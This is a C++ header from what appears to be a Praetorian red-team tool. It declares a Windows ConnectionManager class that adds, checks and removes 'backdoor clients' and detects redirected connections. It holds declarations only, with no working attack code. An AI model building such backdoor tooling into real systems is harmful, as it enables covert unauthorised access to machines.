/*
 * Copyright 2021 Praetorian Security, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#pragma once

// Needed to disable legacy winsock includes otherwise there
// is a compiler error about redefinitions
#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <map>
#include <string>
#include <vector>

#include <Windows.h>

#include "Connection.h"
#include "Packet.h"
#include "Utilities.h"

class ConnectionManager {

public:
	ConnectionManager();

	void AddBackdoorClient(std::string ip);
	BOOL IsBackdoorClient(Packet* packet);
	BOOL IsRedirectedConnection(Packet* packet);
	void RemoveBackdoorClient(std::string ip);

private:

	enum class ConnectionType {
		CONNECT,
		DISCONNECT,
		ESTABLISHED
	};

	void Add(Connection* connection);
	ConnectionManager::ConnectionType GetConnectionState(Packet *packet);
	Connection* Lookup(Packet* packet);
	void Remove(Connection* connection);

	std::vector<std::string> clients;
	std::map<std::string, Connection*> connections;
};